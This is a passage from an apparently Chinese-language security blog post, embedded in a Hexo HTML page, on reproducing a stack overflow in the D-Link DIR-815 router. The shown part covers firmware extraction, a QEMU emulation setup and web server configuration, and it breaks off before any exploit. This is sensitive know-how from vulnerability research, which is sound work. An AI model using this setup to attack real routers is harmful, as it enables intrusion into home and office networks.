@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="Findkey">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://find-key.github.io/2026/05/21/dir-815-router/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DIR-815 栈溢出漏洞复现">
+<meta property="og:url" content="https://find-key.github.io/2026/05/21/dir-815-router/index.html">
+<meta property="og:site_name" content="Find-key&#39;Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://find-key.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-21T03:17:46.000Z">
+<meta property="article:modified_time" content="2026-05-21T03:23:54.146Z">
+<meta property="article:author" content="Find-key">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://find-key.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            DIR-815 栈溢出漏洞复现 | Findkey&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"find-key.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"To Be PWN Master.","subtitle":{"text":[],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Find-key"},{"icon":"fa-solid fa-at","url":"Find_key@foxmail.com"},{"icon":"fa-solid fa-at","url":null},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Friends":{"path":"/links/","icon":"fa-solid fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"为之则易，不为则难","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Findkey&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    FRIENDS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                FRIENDS
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">16</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">DIR-815 栈溢出漏洞复现</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/head_image.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Findkey</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-21 11:17:46</span>
+        <span class="mobile">2026-05-21 11:17:46</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-21 11:23:54</span>
+            <span class="mobile">2026-05-21 11:23:54</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/IOT/">IOT</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>参考文献<br>    - <a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15948" >IoT 安全从零到掌握：超详尽入门指南（实战篇）-先知社区<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>    - <a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm" >[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="固件分离"><a href="#固件分离" class="headerlink" title="固件分离"></a>固件分离</h2><p>由于是复现，网上直接下载<a class="link"   target="_blank" rel="noopener" href="https://rebyte.me/en/d-link/89510/file-592084/" >固件<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，然后直接分离，先使用 binwalk 查看内容</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  dir815_FW_101 binwalk ./DIR-815_FW_1.01b14.bin</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">DECIMAL         HEXADECIMAL     DESCRIPTION</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">0               0x0             DLOB firmware header, </span><br><span class="line">								header size: 108 bytes, </span><br><span class="line">								data size: 3792928</span><br><span class="line"></span><br><span class="line">108             0x6C            LZMA compressed data, </span><br><span class="line">								properties: 0x5D, </span><br><span class="line">								dictionary size: 33554432 bytes, </span><br><span class="line">								compressed size: 979100 bytes, </span><br><span class="line">								uncompressed size: 3017436 bytes</span><br><span class="line"></span><br><span class="line">983180          0xF008C         SquashFS file system, little endian, </span><br><span class="line">								version: 4.0, compression: lzma, </span><br><span class="line">                                inode count: 1526, block size: 262144, </span><br><span class="line">                                image size: 2808054 bytes, </span><br><span class="line">                                created: 2011-05-12 14:14:40</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">Analyzed 1 file <span class="keyword">for</span> 85 file signatures (187 magic patterns) <span class="keyword">in</span> 131.0 milliseconds</span><br></pre></td></tr></table></figure></div>
+<p>看到三个部分：</p>
+<ul>
+<li>D-Link 固件头部</li>
+<li>LZMA 压缩数据块</li>
+<li>根文件系统 rootfs<blockquote>
+<p>提取文件系统前，须安装 sasquatch</p>
+</blockquote>
+</li>
+</ul>
+<p>提取方法：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> binwalk -e ./DIR-815_FW_1.01b14.bin</span><br><span class="line"><span class="comment"># 或者用 dd 命令</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=DIR-815_FW_1.01b14.bin of=squashfs.sqsh bs=1 skip=$((<span class="number">0</span>xF008C)) status=progress</span><br><span class="line"><span class="built_in">sudo</span> sasquatch ./squashfs.sqsh </span><br></pre></td></tr></table></figure></div>
+<p>使用 sudo 是因为，文件系统可能有 &#x2F;dev&#x2F; 之类的东西，</p>
+<h2 id="仿真运行"><a href="#仿真运行" class="headerlink" title="仿真运行"></a>仿真运行</h2><h3 id="下载内核文件"><a href="#下载内核文件" class="headerlink" title="下载内核文件"></a>下载内核文件</h3><p>点击<a class="link"   target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/" >下载地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>下载 vmlinux-3.2.0-4-4kc-malta 和 vmlinux-2.6.32-5-4kc-malta 都可，固件中的内核是 2.6 的，但是笔者下载的是 3.2。</p>
+<h3 id="构建文件系统"><a href="#构建文件系统" class="headerlink" title="构建文件系统"></a>构建文件系统</h3><p>上一步中，已经获得了 .&#x2F;squashfs.sqsh，也就是 SquashFS file system，为了适配内核，得转成 ext2</p>
+<p>64M 应该够了，不够就改大</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> mnt</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=rootfs.ext2 bs=1M count=64 </span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> mount -o loop rootfs.ext2 mnt</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在 mnt&#x2F; 目录下，创建 init 文件，内容如下</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] custom /init started&quot;</span></span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts 2&gt;/dev/null</span><br><span class="line">mount -t devpts devpts /dev/pts 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] setup /var&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /var 2&gt;/dev/null</span><br><span class="line">mount -t ramfs ramfs /var 2&gt;/dev/null</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/tmp /var/run /var/etc /var/log</span><br><span class="line"><span class="built_in">chmod</span> 777 /var/tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] configure eth0&quot;</span></span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0 up</span><br><span class="line">route add default gw 10.0.2.2 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] network status&quot;</span></span><br><span class="line">ifconfig eth0</span><br><span class="line">route -n</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f /htdocs/httpd.conf ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Starting HTTPD...&quot;</span></span><br><span class="line">    /sbin/httpd -n -f /htdocs/httpd.conf &amp;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Error: httpd.conf missing!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] starting shell&quot;</span></span><br><span class="line"><span class="built_in">exec</span> /bin/sh</span><br></pre></td></tr></table></figure></div>
+
+<p>在 mnt&#x2F;htdocs&#x2F; 目录下，创建 httpd.conf ，内容如下</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    InputBufSize 16384</span><br><span class="line">    BufSize 32768</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html       &#123; html htm &#125;</span><br><span class="line">        text/xml        &#123; xml &#125;</span><br><span class="line">        text/plain      &#123; txt &#125;</span><br><span class="line">        image/gif       &#123; gif &#125;</span><br><span class="line">        image/jpeg      &#123; jpg &#125;</span><br><span class="line">        text/css        &#123; css &#125;</span><br><span class="line">        application/javascript &#123; js &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump            &#123; /dump &#125;</span><br><span class="line">        CGI             &#123; cgi &#125;</span><br><span class="line">        Imagemap        &#123; map &#125;</span><br><span class="line">        Redirect        &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, QEMU Ver test&quot;</span><br><span class="line">    ServerId &quot;LAN-1&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0</span><br><span class="line">    Address 0.0.0.0</span><br><span class="line">    Port 80</span><br><span class="line"></span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line"></span><br><span class="line">        